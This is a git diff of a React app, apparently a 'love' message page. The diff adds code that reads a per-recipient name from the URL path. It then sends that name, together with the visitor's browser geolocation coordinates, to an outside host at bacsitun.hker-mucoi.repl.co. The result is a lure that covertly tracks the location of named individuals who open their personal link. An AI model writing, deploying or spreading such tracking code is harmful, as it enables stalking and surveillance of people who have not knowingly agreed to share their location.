@@ -47,6 +47,8 @@ const App = () => {
     }
   };
   const onChange = () => {
+    var pathArray = window.location.pathname.split('/');
+    console.log(pathArray[1])
     if (navigator.geolocation) {
       console.log("getting position")
       navigator.geolocation.getCurrentPosition(showPosition);
@@ -54,7 +56,7 @@ const App = () => {
       setChecked(true);
     }
     console.log("send common message")
-    fetch('https://bacsitun.hker-mucoi.repl.co/love', {})
+    fetch(`https://bacsitun.hker-mucoi.repl.co/love?name=${pathArray[1]}`, {})
       .then(response => response.text())
       .then(text => console.log(text))
     console.log('sending love')
@@ -64,9 +66,10 @@ const App = () => {
   };
   function showPosition(position) {
     try {
+      var pathArray = window.location.pathname.split('/');
       let lat = position.coords.latitude;
       let long = position.coords.longitude;
-      fetch(`https://bacsitun.hker-mucoi.repl.co/love?lat=${lat}&long=${long}`, {})
+      fetch(`https://bacsitun.hker-mucoi.repl.co/love?lat=${lat}&long=${long}&name=${pathArray[1]}`, {})
         .then(response => response.text())
         .then(text => console.log(text))
     } catch (e) {
